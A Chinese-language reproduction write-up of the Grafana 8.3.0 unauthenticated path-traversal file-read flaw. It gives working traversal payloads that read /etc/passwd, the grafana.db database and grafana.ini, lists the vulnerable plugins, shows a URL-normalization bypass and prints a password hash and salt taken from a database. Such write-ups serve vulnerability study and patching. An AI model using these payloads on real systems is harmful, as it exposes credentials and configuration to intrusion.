# 漏洞描述


Grafana是一个跨平台、开源的数据可视化网络应用程序平台，攻击者可以通过构造恶意请求触发该漏洞，造成在未经身份认证的情况下可读取目标主机上的任意文件。



# 影响范围


v8.3.0-beta1

v8.3.0-beta2

v8.3.0

# 漏洞复现

 

复现过程非常简单，Payload如下：

/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd


官方公布的受影响的插件为40个，实际受影响的插件有52个，如下：


liveiconlokitextlogsnewsstatmssqlmixedmysqltempographgaugetabledebugzipkinjaegergeomapcanvasgrafanawelcomexychartheatmappostgrestestdataopentsdbinfluxdbbarchartannolistbargaugegraphitedashlistpiechartdashboardnodeGraphalertlisthistogramtable-oldpluginlisttimeseriescloudwatchprometheusstackdriveralertGroupsalertmanagerelasticsearchgettingstartedstate-timelinestatus-historygrafana-clock-panelgrafana-simple-json-datasourcegrafana-azure-monitor-datasource


还可以读取数据库文件，Payload如下：

/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db


这里看到的一整串字符是password+salt+rands参数值的结合：59f635fdcfd28465c206bd77c13e3e692d7635b051427de8d6f8f416e689a67d8fa3f76a79d77f6adaa167eca854cf54f83aUgWodRj3i82UlYFAWvmm



password：59f635fdcfd28465c206bd77c13e3e692d7635b051427de8d6f8f416e689a67d8fa3f76a79d77f6adaa167eca854cf54f83a（100位）salt：UgWodRj3i8（10位）rands：2UlYFAWvmm（10位）


尝试利用了@jas502n师傅的解密方法：

https://github.com/jas502n/Grafana-CVE-2021-43798

但是发现无法解密成功，我也没看明白师傅项目中提到的数据源密文是哪里来的。

 

还可以读取配置文件，Payload如下：

/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini

还因为 Nginx/Apache 等中间件的 URI_normalization 机制问题，会导致URL标准化，从而无法顺利读取任意文件，可以尝试以下payload进行绕过：

/public/plugins/alertlist/#/../../../../../../../../../../etc/passwd

升级到最新版本即可。
